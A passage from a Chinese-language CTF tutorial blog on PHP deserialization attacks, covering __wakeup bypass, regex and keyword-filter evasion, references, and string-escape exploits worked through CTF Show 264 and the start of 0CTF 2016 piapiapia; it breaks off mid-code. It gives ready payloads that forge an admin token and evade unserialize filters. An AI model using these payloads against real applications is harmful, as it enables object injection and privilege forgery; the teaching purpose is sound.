<p>进行 md5 解密，得到  <em>kkkkkk01123</em> </p>
<p>则 <code>$key=</code></p>
<p>根据题目，不能使 ?key=123</p>
<p>则我们传入 ?key=111&amp;hash=adaa10eef3a02754da03b5a3a6f40ae6</p>
<p>得到 next step is Gu3ss_m3_h2h2.php</p>
<p>然后我们访问 Gu3ss_m3_h2h2.php</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Demo &#123;</span><br><span class="line">    private <span class="variable">$file</span> = <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">        <span class="built_in">echo</span> @highlight_file(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;file != <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>) &#123;</span><br><span class="line">            //the secret is <span class="keyword">in</span> the f15g_1s_here.php</span><br><span class="line">            <span class="variable">$this</span>-&gt;file = <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123;</span><br><span class="line">        die(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        @unserialize(<span class="variable">$var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="string">&quot;Gu3ss_m3_h2h2.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="1-6-反序列化绕过技巧"><a href="#1-6-反序列化绕过技巧" class="headerlink" title="1.6 反序列化绕过技巧"></a>1.6 反序列化绕过技巧</h2><h3 id="1-6-1-php7-1-反序列化对类属性不敏感"><a href="#1-6-1-php7-1-反序列化对类属性不敏感" class="headerlink" title="1.6.1 php7.1+反序列化对类属性不敏感"></a>1.6.1 php7.1+反序列化对类属性不敏感</h3><p>测试环境：php7.2.9</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">    protected <span class="variable">$a</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span>  <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/10/zupN4kL8dmvtAEK.png" alt="image-20210910173603013"></p>
<p>可以看到，即是 a 没有<code>%00*%00</code></p>
<p>也输出了 <code>abc</code></p>
<h3 id="1-6-2-wakeup-绕过"><a href="#1-6-2-wakeup-绕过" class="headerlink" title="1.6.2 __wakeup() 绕过"></a>1.6.2 <code>__wakeup()</code> 绕过</h3><p><strong>在反序列化字符串时，序列化字符串中属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行 。</strong></p>
<p>环境： PHP5 &lt; 5.6.2   PHP7 &lt; 7.0.10</p>
<p>测试：php5.2.17</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$b = new test();</span></span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;aaa</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//属性个数 为 真实个数值  1</span></span><br><span class="line">unserialize(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//属性个数 3 &gt; 真实个数值 1</span></span><br><span class="line">unserialize(<span class="string">&#x27;O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/10/ZmtHakew1TCRDVr.png" alt="image-20210910175548494"></p>
<h3 id="1-6-3-正则绕过"><a href="#1-6-3-正则绕过" class="headerlink" title="1.6.3 正则绕过"></a>1.6.3 正则绕过</h3><p><code>preg_match(&#39;/^O:\d+/&#39;)</code>匹配序列化字符串是否是对象字符串开头</p>
<p>其中的 \d 匹配的是数字 [0-9]，其目的就是检测我们的字符串是否是对象字符串开头</p>
<p><strong>绕过1：<code>+</code> 绕过 (url 中传参使用 编码 %2b)</strong></p>
<p><strong>绕过2：<code>serialize(array(a))</code> 绕过  //a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</strong></p>
<p>测试：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you lose!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +号绕过</span></span><br><span class="line"><span class="variable">$b</span> = str_replace(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line">unserialize(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// serialize(array($a));</span></span><br><span class="line">unserialize(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="1-6-4-十六进制绕过字符过滤"><a href="#1-6-4-十六进制绕过字符过滤" class="headerlink" title="1.6.4 十六进制绕过字符过滤"></a>1.6.4 十六进制绕过字符过滤</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">O:4:<span class="string">&quot;test&quot;</span>:2:&#123;s:4:<span class="string">&quot;%00*%00a&quot;</span>;s:3:<span class="string">&quot;abc&quot;</span>;s:7:<span class="string">&quot;%00test%00b&quot;</span>;s:3:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:4:<span class="string">&quot;test&quot;</span>:2:&#123;S:4:<span class="string">&quot;\00*\00\61&quot;</span>;s:3:<span class="string">&quot;abc&quot;</span>;s:7:<span class="string">&quot;%00test%00b&quot;</span>;s:3:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">表示字符类型的s大写时，会被当成16进制解析。</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">    public <span class="variable">$username</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span>  <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> 666;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> check(<span class="variable">$data</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$data</span>, <span class="string">&#x27;username&#x27;</span>)!==False)&#123;</span><br><span class="line">        <span class="built_in">echo</span>(<span class="string">&quot;你绕不过！！&quot;</span>.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 未作处理前</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = check(<span class="variable">$a</span>);</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br><span class="line">// 做处理后 \75是u的16进制</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = check(<span class="variable">$a</span>);</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<h3 id="1-6-5-引用"><a href="#1-6-5-引用" class="headerlink" title="1.6.5 引用"></a>1.6.5 引用</h3><p>测试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__contruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = &amp;<span class="keyword">$this</span>-&gt;a; <span class="comment">// $b 是 $a 的引用,从而使a 与 b 永远相等</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;a === <span class="keyword">$this</span>-&gt;b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = serialize(nre test());</span><br></pre></td></tr></table></figure>

<h1 id="二、反序列化字符串逃逸"><a href="#二、反序列化字符串逃逸" class="headerlink" title="二、反序列化字符串逃逸"></a>二、反序列化字符串逃逸</h1><p>概述：反序列化的字符串逃逸，包括字符增加与字符减少两类。</p>
<h2 id="2-1-知识一："><a href="#2-1-知识一：" class="headerlink" title="2.1 知识一："></a>2.1 知识一：</h2><ul>
<li>PHP 反序列化时，对类中不存在的属性也会反序列化；</li>
<li>PHP 反序列化时，底层代码是以 <code>;</code>作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且是根据长度判断内容的；即当存在 <code>;&#125;</code> 与 <code>&#123;</code>  匹配时，不会再对 <code>;&#125;</code> 后面的字符串进行反序列化。</li>
</ul>
<p> <strong>简单理解一下</strong></p>
<p><img src="https://i.loli.net/2021/06/12/wOtFRIT7QracXNJ.png" alt="image-20210612153444877"></p>
<p><img src="https://i.loli.net/2021/06/12/yp5auIfPciTKWe3.png" alt="image-20210612153557488"></p>
<p>我们在序列化之后的字符串 <code>;&#125;</code> 后再加上一些内容，其仍可被正常解析，说明在 PHP 反序列时碰到 <code>;&#125;</code> 与前面的 <code>&#123;</code> 配对之后，就会停止反序列化。</p>
<h2 id="2-2-知识二："><a href="#2-2-知识二：" class="headerlink" title="2.2 知识二："></a>2.2 知识二：</h2><ul>
<li>当进行反序列化的字符串中长度与所描述的长度不同时，就会 <strong>报错</strong></li>
</ul>
<h2 id="2-3-字符增多-—-CTF-Show-264"><a href="#2-3-字符增多-—-CTF-Show-264" class="headerlink" title="2.3 字符增多 — CTF Show 264"></a>2.3 字符增多 — CTF Show 264</h2><p><a href="https://ctf.show/challenges#web264-724">题目链接</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># message.php：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># index.php:</span></span><br><span class="line">Your message has been sent <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=base64_encode(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<blockquote>
<ol>
<li>想要获取 flag，需要使 <code>$msg-&gt;token==&#39;admin&#39;</code> ，而默认 <code>public $token=&#39;user&#39;;</code></li>
<li>字符串逃逸：构造 以下内容</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span> = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$msg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ol start="3">
<li>更改 $to 的值</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span> = <span class="string">&#x27;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$msg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:28:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ol start="4">
<li>利用 <code>str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg))</code> 补充字符串长度；增加 27 个长度；</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span> = <span class="string">&#x27;cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$msg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:136:&quot;cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样被替换之后变成以下内容，正好补上 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:136:&quot;cloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>payload：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?f=a&amp;m=b&amp;t=cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后我们抓包，更改 cookie 即可</p>
<p><img src="https://i.loli.net/2021/06/12/yedxVQwtYGucfm3.png" alt="image-20210612211255566"></p>
<h2 id="2-4-字符增多-—-0CTF-2016-piapiapia"><a href="#2-4-字符增多-—-0CTF-2016-piapiapia" class="headerlink" title="2.4 字符增多 — [0CTF 2016]piapiapia"></a>2.4 字符增多 — [0CTF 2016]piapiapia</h2><p><a href="https://buuoj.cn/challenges#[0CTF%202016]piapiapia">题目链接</a></p>
<p><strong>分析：</strong></p>
<blockquote>
<ol>
<li>目录扫描 ，得到 <a href="http://www.zip,查看源码/">www.zip，查看源码</a></li>
</ol>
</blockquote>
<p><img src="https://i.loli.net/2021/06/12/duJgi58ZpxNOwQk.png" alt="image-20210612213229646"></p>
<blockquote>
<ol start="2">
<li>register.php ，注册一下</li>
<li>注册成功之后，将跳转 index.php，进行登录</li>
<li>成功登录，跳转到 update.php，填写详细信息，可进行文件上传</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span 